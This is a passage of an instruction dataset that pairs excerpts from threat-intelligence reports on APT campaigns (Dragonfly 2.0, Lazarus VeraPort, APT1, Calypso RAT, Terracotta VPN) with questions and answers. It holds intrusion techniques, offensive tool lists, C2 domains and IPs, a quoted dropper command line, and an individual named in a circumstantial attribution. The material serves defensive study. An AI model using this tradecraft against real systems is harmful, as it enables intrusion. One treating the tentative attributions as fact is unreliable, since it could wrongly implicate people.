for example, was an HBGary customer. HBGary supported QinetiQ in detection and analysis of on-going targeted attacks against them.  Following the Anonymous compromise and leakage of HBGary information, there is significant information in the public domain regarding the attacks against QinetiQ.  One such example is HBGary's Incident Response Technical Report Supplement for QinetiQ11 . Page 8 of that report, in the \"History of the strain\" section states:\nHBGary has code-named this threat group as \"Soysauce\". This group      is also known as \"Comment Crew\" by some, and also as \"GIF89a\" by      some. The choice of codename is completely arbitrary in this context      and is simply meant to identify a group of Chinese hackers who have      a consistent agenda to target the defense industrial complex.\nThe name \"Comment Crew\" and \"GIF89a\" has been used by researchers because of the behavior of this group to enclose C&C commands within comments on HTML pages or hidden within image files, a technique known as steganography. These indicators have not been witnessed in the attacks previously listed in this report.\nBeyond a likely QinetiQ attack relation, there are a number of other hostnames that indicate potential attack targets of the \"1.php\" Group. Disclosure of other possible victim names is intentionally omitted from this report.\n9. http://hbgary.anonleaks.ch/greg_hbgary_com/2505.html\n10. http://www.mcafee.com/in/resources/white-papers/wp-global-energy-cyberattacks-night-dragon.pdf\n11. http://publicintelligence.info/HBGary-QinetiQ.pdf\n\"   There have been a number of interesting hostnames used with \"1.php\" C&C domains that may include other potential victims. \"\n-Zscaler ThreatLabZ\nMedium Headline: 4.1 Conduct logging and analytics within your environment\nThis report shows an evolution of the beaconing behavior from the \"1.php\" Group.  Relying solely on existing signatures of known threats would not have triggered detections. By identifying transactions that are anomalous, it is possible to detect previous or recurring incidents, such as those identified above.  Some of the anomalies, which led to the findings in this report, include:\n\u2022 HTTP version 1.0 requests with version 1.1 responses\n\u2022 Numerous transactions to an unknown / uncategorized domain\n\u2013 Some of these transactions were to No-IP dynamic DNS domains\n\u2022 Blocking or heavily monitoring the communication to dynamic    DNS domains is recommended\n\u2013 Some of these domains were parked\n\u2013 Transactions occur during non-standard times (nights / weekends)\n\u2013 Some transactions (in particular the GET beacons) had a larger    request size than response size\n\u2022 Microsoft IE 6 user-agent (UA) string usage in an environment that does not typically use this UA\nMedium Headline: 4.2 Correlate with other sources\nBy leveraging data sources such as passive DNS, domain registration information, other open-source reports, and other research - it is possible to derive information about probable domains and infrastructure used, in other attacks by the same group of attackers.  In some cases, this information may provide indicators as to the targets or purpose of the attacks.  It should also be noted that making too many assumptions or believing unverified indicators as fact can lead to misleading information. Anyone can set a hostname for a C&C to be \"QINETIQ\" for example. However, by correlating these domains with a group that has been identified as being involved in APT attacks, provides a stronger indication into their possible target.\nMedium Headline: 4.3 APTs are not always that 'Advanced'\nThe above incident reports document (spear-) phishing with a malicious PDF attachment, or link to a binary executable with a Poison Ivy RAT payload. While the exploitation used in some of the crafted PDF attachments may be considered advanced, for the most part the attack is one of social-engineering. This is nothing new and something that other fraudsters / criminals have been leveraging for many years. RSA recently wrapped up their APT summit and their first finding concluded that the \"attack vector [is] shifting from technology to people\". 12\nQuestion: What techniques can be employed to detect anomalous transactions that might indicate an APT attack, as demonstrated by the '1.php' Group? How can these techniques help in identifying previous or recurring incidents?",
    "output": "Answer: To detect anomalous transactions that might indicate an APT attack, several techniques can be employed. These include identifying HTTP version 1.0 requests with version 1.1 responses, numerous transactions to unknown or uncategorized domains (including No-IP dynamic DNS domains), transactions occurring during non-standard times (nights/weekends), and the use of outdated user-agent strings like Microsoft IE 6 in environments where it is not typically used. Additionally, transactions with a larger request size than response size, especially for GET beacons, can be indicative of anomalous activity. These techniques help in identifying previous or recurring incidents by highlighting patterns that deviate from normal behavior, allowing for the detection of threats that might not be caught by existing signatures of known threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the primary infection vectors used by the Dragonfly group in the 'Dragonfly 2.0' campaign, and why are these methods effective in targeting the energy sector?",
    "output": "The primary infection vectors used by the Dragonfly group in the 'Dragonfly 2.0' campaign include malicious emails, watering hole attacks, and Trojanized software. Malicious emails are effective because they can be highly targeted and contain content specific to the energy sector, making them more likely to be opened by employees. Watering hole attacks involve compromising websites frequently visited by energy sector personnel, allowing attackers to harvest network credentials. Trojanized software, such as legitimate applications modified to include malware, can bypass traditional security measures. These methods are effective because they exploit human curiosity and trust, and they leverage the interconnected nature of modern digital environments within the energy sector.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: CHINA EXPOSED: 2013 REPORTS AND DISCLOSURES JOLT GOVERNMENT CYBER OPERATIONS TO THE FOREFRONT OF THE U.S. SECURITY DIALOGUE\nAs Beijing embarked upon sweeping changes impacting its use of network operations, U.S. Government and defense officials wrestled with how to effectively confront China regarding its cyber espionage activity.26 Although officials had discussed China's use of cyber espionage for years, the issue was not widely recognized in the public sphere. However, early 2013 saw multiple disclosures of breaches targeting media outlets, the release of our APT1 report, and additional reporting that attributed widespread corporate intellectual property theft to military units within China's People's Liberation Army (PLA). This exposure catapulted the issue of Chinese cyber espionage into the public consciousness, and likely provided the U.S. Government with increased momentum with which to confront Beijing - momentum that would quickly dissipate with Edward Snowden's disclosures of U.S. cyber activities.\nIn January 2013, the New York Times disclosed details of a network compromise targeting its reporters that was allegedly the work of the Chinese military.27 Several weeks later, we released our APT1 report, attributing years of corporate intellectual property theft to Unit 61398 of\nthe PLA. APT1 and the many other exposure reports that followed describe in detail the tools, tactics, and targets of Chinese cyber operations, laying bare evidence to support long-held suspicions of China's large-scale cyber espionage activity.\nWhile the reports prompted outraged denials from the Chinese government, U.S. Government officials described the findings as \"essentially correct\" and \"completely consistent with the type of activity [the U.S. government has] been seeing for some time.\"28 29 The threat posed by China's cyber operations emerged as a prominent theme in countless speeches, statements, and reports from U.S. leaders and federal agencies. In May 2013, the Pentagon's annual report to Congress directly accused China of using its military to conduct cyber operations against U.S. firms, and President Obama prepared to raise the issue at the U.S.\u2013China Presidential Summit the following month.30 However, Edward Snowden's coinciding disclosures of U.S. cyber activities diverted public attention to U.S. clandestine operations, complicating any leverage that the U.S. might have had to rebuke China over its economic espionage activities.31\n26  http://www.reuters.com/article/us-usa-china-cyber-idUSTRE7934L220111004\n27  http://www.nytimes.com/2013/01/31/technology/chinese-hackers-infiltrate-new-york-times-computers.html?_r=0\n28  https://www.technologyreview.com/s/511981/unmasked-but-unfazed-chinese-hacking-group-is-still-active/\n29  http://www.nytimes.com/2013/02/19/technology/chinas-army-is-seen-as-tied-to-hacking-against-us.html\n30  http://www.bbc.com/news/world-asia-china-22798572\n31  http://www.bbc.com/news/world-asia-china-22798572\n\nWhat role did the APT1 report play in shaping the U.S.-China dialogue on cyber espionage, and how did it influence the broader geopolitical landscape?",
    "output": "The APT1 report played a pivotal role in shaping the U.S.-China dialogue on cyber espionage by providing concrete evidence that attributed years of corporate intellectual property theft to Unit 61398 of the People's Liberation Army (PLA). The report laid bare the tools, tactics, and targets of Chinese cyber operations, substantiating long-held suspicions of China's extensive cyber espionage activities. This exposure catapulted the issue into the public sphere and gave the U.S. government increased leverage to confront China. U.S. officials described the findings as 'essentially correct' and 'completely consistent' with their observations. The threat posed by China's cyber operations became a central theme in numerous speeches and reports from U.S. leaders and federal agencies. However, the geopolitical landscape was further complicated by Edward Snowden's disclosures of U.S. cyber activities, which diverted public attention and undermined the U.S.'s ability to effectively rebuke China for its actions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Key Findings\nIn this report we track a malware operation targeting members of the Tibetan Parliament over August and October 2016.\nThe operation uses known and patched exploits to deliver a custom backdoor known as KeyBoy.\nWe analyze multiple versions of KeyBoy revealing a development cycle focused on avoiding basic antivirus detection.\nThis operation is another example of a threat actor using \"just enough\" technical sophistication to exploit a target.\nRead the text above and answer this question: How does the development cycle of KeyBoy, as observed in the operation targeting the Tibetan Parliament, reflect the threat actor's strategy to maintain effectiveness while minimizing detection?",
    "output": "The development cycle of KeyBoy, as analyzed in the operation targeting members of the Tibetan Parliament, reveals a focus on avoiding basic antivirus detection. This strategy allows the threat actor to maintain the effectiveness of their malware without needing to invest in highly sophisticated techniques. By using known and patched exploits, the operators can continue to infiltrate systems that lack up-to-date security measures, thereby achieving their goals with minimal risk of exposure. This approach demonstrates the 'just enough' technical sophistication principle, where the attackers balance the effort required to develop and deploy their tools with the likelihood of success against their targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Latest Lazarus supply-chain attack\nTo understand this novel supply-chain attack, you should be aware that South Korean internet users are often asked to install additional security software when visiting government or internet banking websites.\nWIZVERA VeraPort, referred to as an integration installation program, is a South Korean application that helps manage such additional security software. With WIZVERA VeraPort installed on their devices, users receive and install all necessarily software required by a specific website with VeraPort (e.g., browser plug-ins, security software, identity verification software, etc.). Minimal user interaction is required to start such a software installation from a website that supports WIZVERA VeraPort. Usually, this software is used by government and banking websites in South Korea. For some of these websites it is mandatory to have WIZVERA VeraPort installed for users to be able to access the sites' services.\nThe Lazarus attackers abused the above-mentioned mechanism of installing security software in order to deliver Lazarus malware from a legitimate but compromised website. However, it should be noted that a successful malware deployment using this method requires a number of preconditions; that's why it was used in limited Lazarus campaigns. To make this attack possible:\nthe victim must have WIZVERA VeraPort software installed\nthe victim must visit a compromised website that already has support for WIZVERA VeraPort\nthis website must have specific entries in its VeraPort configuration file that allows attackers to replace regular software in its VeraPort software bundle with their malware.\nIt is important to note that, based on our analysis, we believe that these supply-chain attacks happen at websites that use WIZVERA VeraPort, rather than at WIZVERA itself.\nWebsites that support WIZVERA VeraPort software contain a server-side component, specifically some JavaScripts and a WIZVERA configuration file. The configuration file is base64-encoded XML containing the website address, a list of software to install, download URLs, and other parameters.\nThese configuration files are digitally signed by WIZVERA. Once downloaded, they are verified using a strong cryptographic algorithm (RSA), which is why attackers can't easily modify the content of these configuration files or set up their own fake website. However, the attackers can replace the software to be delivered to WIZVERA VeraPort users from a legitimate but compromised website. We believe this is the scenario the Lazarus attackers used.\nIt should be noted that WIZVERA VeraPort configurations contain an option to verify the digital signature of downloaded binaries before they are executed, and in most cases this option is enabled by default. However, VeraPort only verifies that the digital signature is valid, without checking to whom it belongs. Thus, to abuse WIZVERA VeraPort, attackers must have any valid code-signing certificate in order to push their payload via this method or get lucky and find a VeraPort configuration that does not require code-signing verification.\nSo far, we have observed two malware samples that were delivered using this supply-chain attack and both were signed:\nThe attackers used illegally obtained code-signing certificates in order to sign the malware samples. Interestingly, one of these certificates was issued to the US branch of a South Korean security company.\nThe attackers camouflaged the Lazarus malware samples as legitimate software. These samples have similar filenames, icons and VERSIONINFO resources as legitimate South Korean software often delivered via WIZVERA VeraPort. Binaries that are downloaded and executed via the WIZVERA VeraPort mechanism are stored in %Temp%\\[12_RANDOM_DIGITS]\\.\nIt should be noted that WIZVERA VeraPort's configuration has an option not only to verify digital signatures, but also to verify the hash of downloaded binaries. If this option is enabled, then such an attack cannot be performed so easily, even if the website with WIZVERA VeraPort is compromised.\nBig Headline: Attribution\nWe strongly attribute this supply-chain attack to the Lazarus group, based on the following aspects:\n1. Community agreement: The current attack is a continuation of what KrCERT has called Operation Bookcodes. While KrCERT hasn't attributed that campaign to the Lazarus group, Kaspersky did in their report about .\n2. Toolset characteristics and detection:\n1. The initial dropper is a console application that requires parameters, executing the next stages in a cascade and utilizes an encryption, cf. (<https://www.welivesecurity.com/2017/02/16/demystifying-targeted-malware-used-polish-banks/>)the watering hole attacks against Polish and Mexican banks\n2. The final payload is a RAT module, with TCP communications and its commands indexed by 32-bit integers, cf.\n3. Many tools delivered via this chain are already flagged as NukeSped by ESET software. For example, the signed Downloader in the Analysis section is based on a project called WinHttpClient and it leads to the similar tool with hash 1EA7481878F0D9053CCD81B4589CECAEFC306CF2, which we link with with a sample from Operation Blockbuster (CB818BE1FCE5393A83FBFCB3B6F4AC5A3B5B8A4B). The connection between the latter two is the dynamic resolution of Windows APIs where the names are XOR-encrypted by 0x23, e.g., dFWwLHFMjMELQNBWJLM is the encoding of GetTokenInformation.\n3. Victimology: the Lazarus group has a long history of attacks against victims in South Korea like (<https://www.mcafee.com/enterprise/en-us/assets/white-papers/wp-dissecting-operation-troy.pdf>)Operation Troy, including (<https://www.fireeye.com/blog/threat-research/2017/09/north-korea-interested-in-bitcoin.html>)DDoS attacks  in 2011,  in 2013, or South Korean cryptocurrency exchanges targeted in 2017.\n4. Network infrastructure: the server-side techniques of webshells and the organization of C&Cs are covered very precisely in KrCERT's white paper #2. The current campaign uses a very similar setup as well.\n5. Eccentric approach:\n1. In intrusion methods: The unusual method of infiltration is a clue that could be attributed to a sophisticated and professionally organized actor like Lazarus. In the past, we saw how a vulnerability in software existing only in (<https://www.virusbulletin.com/uploads/pdf/magazine/2018/VB2018-Kalnai-Poslusny.pdf>)specific networks was leveraged by this group, and not visible with any other APT actor. For example, \"A Strange Coinminer\" delivered through the ManageEngine Desktop Central software.\n2. In encryption methods: We saw a Spritz variant of RC4 in the watering hole attacks against Polish and Mexican banks; later Lazarus used a modified RC4 in (<https://web-assets.esetstatic.com/wls/2020/06/ESET_Operation_Interception.pdf>)Operation In(ter)ception. In this campaign, it is a modified A5/1 stream cipher that degrades to a single-byte XOR in many cases.\nBig Headline: Malware analysis\nIt is a common characteristic of many APT groups, especially Lazarus, that they unleash their arsenal within several stages that execute as a cascade: from the dropper to intermediate products (the Loader, serving as an injector) up to the final payloads (the Downloader, the Module). The same is true for this campaign.\nDuring our analysis we found similarities in code and architecture between Lazarus malware delivered via this WIZVERA supply-chain attack and the malware described in the Operation BookCodes report ((<https://www.boho.or.kr/filedownload.do?attach_file_seq=2452&attach_file_id=EpF2452.pdf>)part one, (<https://www.boho.or.kr/filedownload.do?attach_file_seq=2455&attach_file_id=EpF2455.pdf>)part two) published by Korea Internet & Security Agency this year.\nBig Headline: Signed initial downloader\nThis is the Lazarus component delivered via the VeraPort hijack described earlier. The signed initial downloaders are Themida-protected binaries, which download, decrypt and execute other payloads in memory, without dropping them to the disk. This downloader sends an HTTP POST request to a hardcoded C&C server, decrypts the server's answer using the RC4 algorithm, and executes it in memory using its own loader for PE files.\nInterestingly, both discovered samples send a small, hardcoded ID in the body of the POST request: MagicLineNPIZ.gif or delfino.gif.\nMedium Headline: Dropper\nThis is the initial stage of the cascade. While one can't see any polymorphism or obfuscation in the code, it encapsulates three encrypted files in its resources. Moreover, it's a console application expecting three parameters in an encrypted state: the name of the first file (the Loader, Btserv.dll), the name of the second file (the Downloader, bcyp655.tlb), and the necessary decryption key for the previous values (542).\nBIT388293.tmp oJaRh5CUzIaOjg== aGlzejw/PyR+Zmg= 542\nThe extraction of resources is one of two main roles of the dropper; it does so in the %WINDOWS%\\SYSTEM32 folder, decrypting the Loader and preserving the encrypted state of the Downloader that will be decrypted just before being injected into another process. It also drops the configuration file assocnet.inf that will later be leveraged by the final payloads, namely the Downloader and the Module. Then it chooses a service by checking the following list of three legitimate service names Winmgmt;ProfSvc;wmiApSrv; and injects the Downloader into the matched service using reflective DLL injection.\nThe file name of the Loader is stored in the following Windows registry value:\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages\n\nHow did the Lazarus group ensure that their malware was executed on the victim's machine without raising suspicion, and what role did the initial downloader play in this process?",
    "output": "The Lazarus group ensured that their malware was executed on the victim's machine by using an initial downloader that was Themida-protected. This downloader sent an HTTP POST request to a hardcoded C&C server, decrypted the server's response using the RC4 algorithm, and executed it in memory without dropping it to the disk. The initial downloader played a crucial role in this process by acting as the first stage of the cascade, downloading and decrypting other payloads in memory.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Dragonfly: Western energy sector targeted by sophisticated attack group\n9/5/2017\nThe energy sector in Europe and North America is being targeted by a new wave of cyber attacks that could provide attackers with the means to severely disrupt affected operations. The group behind these attacks is known as Dragonfly. The group has been in operation since at least 2011 but has re-emerged over the past two years from a quiet period (<https://www.symantec.com/connect/blogs/dragonfly-western-energy-companies-under-sabotage-threat-energetic-bear>)following exposure by Symantec and a number of other researchers in 2014. This \"Dragonfly 2.0\" campaign, which appears to have begun in late 2015, shares tactics and tools used in earlier campaigns by the group.\nThe energy sector has become an area of increased interest to cyber attackers over the past two years. Most notably, (<http://www.reuters.com/article/us-ukraine-cyber-attack-energy-idUSKBN1521BA>)disruptions to Ukraine's power system in 2015 and 2016 were attributed to a cyber attack and led to power outages affecting hundreds of thousands of people. In recent months, there have also been media reports of (<https://www.nytimes.com/2017/07/06/technology/nuclear-plant-hack-report.html>)in some European countries, as well as reports of companies that manage nuclear facilities in the U.S. being compromised by hackers.\nThe Dragonfly group appears to be interested in both learning how energy facilities operate and also gaining access to operational systems themselves, to the extent that the group now potentially has the ability to sabotage or gain control of these systems should it decide to do so. Symantec customers are protected against the activities of the Dragonfly group.\nDragonfly 2.0\nSymantec has evidence indicating that the Dragonfly 2.0 campaign has been underway since at least December\n2015 and has identified a distinct increase in activity in 2017.\nSymantec has strong indications of attacker activity in organizations in the U.S., Turkey, and Switzerland, with traces of activity in organizations outside of these countries. The U.S. and Turkey were also among the countries targeted by Dragonfly in its earlier campaign, though the focus on organizations in Turkey does appear to have increased dramatically in this more recent campaign.\nAs it did in its prior campaign between 2011 and 2014, Dragonfly 2.0 uses a variety of infection vectors in an effort to gain access to a victim's network, including malicious emails, watering hole attacks, and Trojanized software.\nThe earliest activity identified by Symantec in this renewed campaign was a malicious email campaign that sent emails disguised as an invitation to a New Year's Eve party to targets in the energy sector in December 2015.\nThe group conducted further targeted malicious email campaigns during 2016 and into 2017. The emails contained very specific content related to the energy sector, as well as some related to general business concerns. Once opened, the attached malicious document would attempt to leak victims' network credentials to a server outside of the targeted organization.\nIn July, Cisco blogged about (<http://blog.talosintelligence.com/2017/07/template-injection.html>)email-based attacks targeting the energy sector using a toolkit called Phishery. Some of the emails sent in 2017 that were observed by Symantec were also using the Phishery toolkit ((<https://www.symantec.com/security_response/writeup.jsp?docid=2017-071414-3257-99>)Trojan.Phisherly), to steal victims' credentials via a template injection attack. This toolkit became generally available on GitHub in late 2016,\nAs well as sending malicious emails, the attackers also used watering hole attacks to harvest network credentials, by compromising websites that were likely to be visited by those involved in the energy sector.\nThe stolen credentials were then used in follow-up attacks against the target organizations. In one instance, after a victim visited one of the compromised servers, (<https://www.symantec.com/security_response/writeup.jsp?docid=2017-071207-0015-99>)Backdoor.Goodor was installed on their machine via PowerShell 11 days later. Backdoor.Goodor provides the attackers with remote access to the victim's machine.\nIn (<tel:2014>)2014, Symantec observed the Dragonfly group compromise legitimate software in order to deliver malware to victims, a practice also employed in the earlier 2011 campaigns. In the 2016 and 2017 campaigns the group is using the evasion framework Shellter in order to develop Trojanized applications. In particular, (<https://www.symantec.com/security_response/writeup.jsp?docid=2017-071206-3422-99>)Backdoor.Dorshel was delivered as a trojanized version of standard Windows applications.\nSymantec also has evidence to suggest that files masquerading as Flash updates may be used to install malicious backdoors onto target networks\u2014perhaps by using social engineering to convince a victim they needed to download an update for their Flash player. Shortly after visiting specific URLs, a file named \"install_flash_player.exe\" was seen on victim computers, followed shortly by the (<https://www.symantec.com/security_response/writeup.jsp?docid=2017-073103-3836-99>)Trojan.Karagany.B backdoor.\nTypically, the attackers will install one or two backdoors onto victim computers to give them remote access and allow them to install additional tools if necessary. Goodor, Karagany.B, and Dorshel are examples of backdoors used, along with (<https://www.symantec.com/security_response/writeup.jsp?docid=2017-073113-4148-99>)Trojan.Heriplor.\nWestern energy sector at risk from ongoing cyber attacks, with potential for sabotage #dragonfly\nQ: How has the Dragonfly group evolved its tactics and tools in the 'Dragonfly 2.0' campaign compared to its previous operations, and what does this evolution indicate about their capabilities and intentions?",
    "output": "The Dragonfly group has evolved its tactics and tools in the 'Dragonfly 2.0' campaign by continuing to use methods such as malicious emails, watering hole attacks, and Trojanized software, but with updated techniques. For example, they have used the Phishery toolkit to steal credentials via template injection attacks, which became available on GitHub in late 2016. They have also employed the evasion framework Shellter to develop Trojanized applications, specifically delivering backdoors like Backdoor.Dorshel through trojanized versions of standard Windows applications. Additionally, they have used files masquerading as Flash updates to install malicious backdoors. This evolution indicates that the group is adaptive and capable of leveraging new tools and techniques to maintain their effectiveness. Their continued focus on gaining access to operational systems suggests a persistent intent to learn about and potentially disrupt energy facilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Mantra Tech Ventures and INNEFU\nMantra Tech Ventures is the registration service for several of the malicious domains that have been in use. The service first came to our attention because it was used for registering the Command & Control domains cobrapub.com, mymyntra.net, and n00b4u.com. In addition, Mantra Tech Ventures owns abhedya.net, which seems to be a name server service for domains registered by them. Abhedya has been used by several sites in the attack infrastructure like currentnewsstore.com, crvhostia.net, webmicrosoftupdate.net and fuzzyfile.net.\nabedhya.net is currently a privacy protected domain, but it used to be registered by one Arun Bansal, CEO and founder of Mantra Ventures and the \"Ethical Hacking Institute\" hackingtruths.org.\nDomain Name: ABHEDYA.NET\nRegistrant:\nHackingTruths Arun Bansal\n(arun@hackingtruths.org)\n*** ********* ***** *******\n******\nDelhi,110085\nIN\nThe domain appinonline.com is also hosted on the cloud service mantragrid.com, a Mantra Ventures company.\nThere is another interesting detail: We found a connection log on one of the open drop folders earlier mentioned. This log folder was named \"test\" and data in it was uploaded from an IP belonging to the French provider OVH. The log contained data from a lab test PC whose registered owner was \"innefu\".\nThere is indeed an Indian information security consulting group named Innefu. The domain innefu.com was registered by the same Arun Bansal. Innefu also hires \"ethical hackers\":\nIt is possible that Mantra Tech Ventures hosted the malicious sites by coincidence, and it is possible that INNEFU (if indeed the mentioned log came from them) just happened to run the malware in an automatic test system like many other security vendors do as part of their malware analysis research.\nBig Headline: Conclusion\nWhen researching the attack against Telenor we were able to uncover that actors apparently operating from India have been conducting attacks against business, government and political organizations around the world for over three years.\nThere are also indicators of involvement by private sector companies or persons connected to these, though these data are circumstantial and may be attempts to implicate said companies.\nWe have no visibility into whether the attacks were done on behalf of others, and if so who commissioned them or whether all attacks were commissioned by one entity or by several.\nThe methods used were primarily based on different social engineering tactics rather than exploits, but history has shown that social engineering based attacks can be very successful, confirmed once again by looking at the data we have been able to uncover.\nOrganizations today need to realize that it's not a matter of whether they will be compromised but a question of when and have a plan in place for how to deal with those compromises.\nBig Headline: Bibliography\n1. Scumware.org. Scumware search. scumware.org. [Online] http://www.scumware.org/report/173.236.24.254.\n2. MacKenzie, Stuart. [Online] http://www.thetimes.co.uk/tto/multimedia/archive/00372/DOC100113100120132_372895a.pdf.\n3. Wikipedia. CME Group. Wikipedia. [Online] http://en.wikipedia.org/wiki/CME_Group.\n4. WIPO. WIPO Arbitration and Mediation Center. WIPO. [Online] http://www.oapi.wipo.net/amc/en/domains/search/text.jsp?case=D2012-1666.\n5. Domaintools. Domaintools History. Domaintools. [Online] http://www.domaintools.com/research/whoishistory/?page=details&domain=hackerscouncil.com&date=2011-04-03.\n6. ThreatExpert Analysis. ThreatExpert. [Online] http://www.threatexpert.com/report.aspx?md5=4a44b6b6463fa1a8e0515669b10bd338.\n7. Scumware.org. Scumware search. Scumware.org. [Online] http://www.scumware.org/report/bluecreams.com.\n8. Viruswatch. Virus-sites with status changes. Clean-MX.com. [Online] http://lists.cleanmx.com/pipermail/viruswatch/20110317/023586.html.\nPassive DNS data provided by ISC Security (https://security.isc.org/)\nBig Headline: Appendixes (available in a separate document)\nA. Samples extracted from Telenor intrusion\nB. Some related cases based on behaviour and malware similarity parameters.\nC. Malware string indicators\nD. Project and debug paths extracted from executables\nE. Domain names connected to case\nF. IP addresses connected to case\nG. Sample MD5's\nNorman Shark is a global leader and pioneer in proactive security software solutions and forensics malware tools. Norman Shark offers enterprise customers a portfolio of solutions for analyzing and building defensible networks against advanced targeted attacks. Formerly part of Norman AS, a Norway-based IT security company established in 1984, Norman Shark became an independent company in January 2013, to allow the company to focus on developing solutions for  Threat Discovery, security analytics and ICS protection to address the growing needs of the enterprise market.\n\nWhat role did the domain abhedya.net play in the attack infrastructure, and who was initially associated with its registration?",
    "output": "The domain abhedya.net played a crucial role as a name server service for several domains used in the attack infrastructure. Initially, it was registered by Arun Bansal, the CEO and founder of Mantra Ventures and the 'Ethical Hacking Institute' hackingtruths.org. Although it is now privacy protected, its past association with Arun Bansal indicates a potential link between Mantra Ventures and the attack infrastructure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: BACKGROUND\nVirtual Private Networks (VPN) are very popular. They are part and parcel for almost every enterprise network, especially those with remote employees. Aside from VPNs for enterprises, there are many reputable commercial VPN services that offer low-cost, reliable service to individual users. These users employ VPNs for reasons that might include connection security, protection of private data, online gaming acceleration, and bypassing service provider restrictions. VPNs are also used by cyber criminals, as it allows them to obscure their true source location. When a commercial VPN service provider uses resources such as servers and copious bandwidth stolen or repurposed from unsuspecting victims for purposes of profit, analysis and reporting are in order. In this report, RSA Research exposes one such operator doing business with multiple VPN brand names marketed primarily in the People's Republic of China (PRC). Operating with more than 1500 end nodes around the world, RSA Research has confirmed that at least thirty of the host systems are compromised Windows servers that were \"harvested\" without the victims' knowledge or permission. The operators behind Terracotta VPN continue their broad campaign to compromise multiple victim organizations around the world. RSA Research is reporting on the associated VPN operator because:\n\u2022 There is evidence of compromise of multiple victim organization systems around the world,\n\u2022 There is evidence of illicit installation of software and malicious remote access tools on the victims' servers, and\n\u2022 There is evidence of theft of victims' resources and bandwidth to serve clients (including advanced threat actors) with a high-performance anonymity service.\nNOTE: There are two classes of victims described and referred to in this report. Most of the references to victims are of those unknowingly enlisted into the Terracotta VPN service, as outlined above. A second class of victims, APT targets, have been targeted by other actors who are using Terracotta for anonymization and obfuscation. Throughout this report, we specificly refer to APT-victims accordingly, while leaving the generic 'victim' designation for the Terracotta nodes.\n\nQuestion: How does the Terracotta VPN operation manage to obscure the true source location of its users, and what are the implications for cybersecurity professionals dealing with such threats?\n\nAnswer:",
    "output": "The Terracotta VPN operation obscures the true source location of its users by utilizing compromised Windows servers as end nodes. These servers are 'harvested' without the victims' knowledge or permission, allowing the VPN service to provide a high-performance anonymity service. This practice has significant implications for cybersecurity professionals. Firstly, it means that identifying the origin of malicious activities becomes more challenging, as the traffic appears to come from legitimate but compromised servers. Secondly, it highlights the need for robust security measures to prevent servers from being compromised and repurposed in this manner. Additionally, it underscores the importance of monitoring network traffic for unusual patterns that might indicate unauthorized use of resources.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Initial infection vector\nThe attackers accessed the internal network of a compromised organization by using an ASPX web shell. They uploaded the web shell by exploiting a vulnerability or, alternately, guessing default credentials for remote access. We managed to obtain live traffic between the attackers and the web shell.\nThe traffic indicates the attackers connected from IP address 46.166.129.241. That host contains domain tv.teldcomtv.com, the C2 server for the group's trojan. Therefore the hackers use C2 servers not only to control malware, but also to access hosts on compromised infrastructures.\nThe attackers used the web shell to upload utilities1 and malware,2 execute commands, and distribute malware inside the network. Examples of commands from the traffic are demonstrated in the following screenshot.\n1. See the section \"Lateral movement.\"\n2. See the section \"Analyzing Calypso RAT malicious code.\"\nBig Headline: Lateral movement\nThe group performed lateral movement by using the following publicly available utilities and exploits:\n\u2022 SysInternals\n\u2022 Nbtscan\n\u2022 Mimikatz\n\u2022 ZXPortMap\n\u2022 TCP Port Scanner\n\u2022 Netcat\n\u2022 QuarksPwDump\n\u2022 WmiExec\n\u2022 EarthWorm\n\u2022 OS_Check_445\n\u2022 DoublePulsar\n\u2022 EternalBlue\n\u2022 EternalRomance\nOn compromised computers, the group stored malware and utilities in either C:\\RECYCLER or C:\\ProgramData. The first option was used only on computers with Windows XP or Windows Server 2003 with NTFS on drive C.\nThe attackers spread within the network either by exploiting vulnerability MS17-010 or by using stolen credentials. In one instance, 13 days after the attackers got inside the network, they used DCSync and Mimikatz to obtain the Kerberos ticket of the domain administrator, \"passing the ticket\" to infect more computers.\nUse of such utilities is common for many APT groups. Most of those utilities are legitimate ones used by network administrators. This allows the attackers to stay undetected longer.\nBig Headline: Attribution\nIn one attack, the group used Calypso RAT, PlugX, and the Byeby trojan. Calypso RAT is malware unique to the group and will be analyzed in detail in the text that follows.\nPlugX has traditionally been used by many APT groups of Asian origin. Use of PlugX in itself does not point to any particular group, but is overall consistent with an Asian origin.\nThe Byeby trojan1 was used in the SongXY malware campaign back in 2017. The version used now is modified from the original. The group involved in the original campaign is also of Asian origin. It performed targeted attacks on defense and government-related targets in Russia and the CIS countries. However, we did not find any clear-cut connection between the two campaigns.\nWhen we analyzed the traffic between the attackers' server and the web shell, we found that the attackers used a non-anonymous proxy server. The X-Forwarded-For header passed the attackers' IP address (36.44.74.47). This address would seem to be genuine (more precisely, the first address in a chain of proxy servers).\n1.\nThe IP address belongs to China Telecom. We believe the attackers could have been careless and set up the proxy server incorrectly, thus disclosing their real IP address. This is the first piece of evidence supporting the Asian origins of the group.\nThe attackers also left behind a number of system artifacts, plus traces in utility configurations and auxiliary scripts. These are also indicative of the group's origin.\nFor instance, one of the DoublePulsar configuration files contained external IP address 103.224.82.47, presumably for testing. But all other configuration files contained internal addresses.\nThis IP address belongs to a Chinese provider, like the one before, and it was most likely left there due to the attackers' carelessness. This constitutes additional evidence of the group's Asian origins.\nWe also found BAT scripts that launched ZXPortMap and EarthWorm for port forwarding. Inside we found network indicators www.sultris.com and 46.105.227.110.\nThe domain in question was used for more than just tunneling: it also served as C2 server for the PlugX malware we found on the compromised system. As already mentioned, PlugX is traditionally used by groups of Asian origin, which constitutes yet more evidence.\nTherefore we can say that the malware and network infrastructure used all point to the group having an Asian origin.\nBig Headline: Dropper\nThe dropper extracts the payload as an installation BAT script and CAB archive, and saves it to disk. The payload inside the dropper has a magic header that the dropper searches for. The following figure shows an example of the payload structure.\nThe dropper encrypts and decrypts data with a self-developed algorithm that uses CRC32 as a 